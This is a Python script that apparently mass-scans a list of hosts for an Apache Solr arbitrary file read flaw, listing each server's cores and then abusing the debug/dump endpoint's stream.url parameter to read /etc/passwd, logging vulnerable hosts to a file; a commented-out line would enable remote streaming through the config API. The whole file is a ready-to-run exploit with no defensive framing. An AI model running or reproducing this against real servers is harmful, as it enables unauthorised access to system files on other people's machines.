#!/usr/bin/python
# coding: UTF-8
import requests
import re
import random


def get_core():
    with open(r"ip.txt", "r", encoding='utf8') as scan_host:
        for host in scan_host:
            if host[:4] != "http":
                host = "https://" + host
            host = host.strip('\n')
            url=host+'/solr/admin/cores?indexInfo=false&wt=json'
            #print(url)
            core_data=requests.get(url,timeout=3).json()
            #print(core_data)
            if core_data['status']:
                core=list(core_data['status'].keys())[0]
                #jsonp_data={"set-property":{"requestDispatcher.requestParsers.enableRemoteStreaming":'true'}}
                #requests.post(url=host+"/solr/%s/config"%core,json=jsonp_data)

                result_data=requests.post(url=host+'/solr/%s/debug/dump?param=ContentStreams'%core,data={"stream.url":"file:///etc/passwd"}).json()
                if result_data['streams']:
          
                    print("\033[32m[o] 响应为:\n{} \033[0m".format(result_data['streams'][0]['stream']))
                    f = open('vul.txt', 'a+',encoding="utf-8")
                    f.write(host)
                    f.write("\n")
                    f.close()
            else:
                    exit("不存在此漏洞")
if __name__ == '__main__':
    get_core()
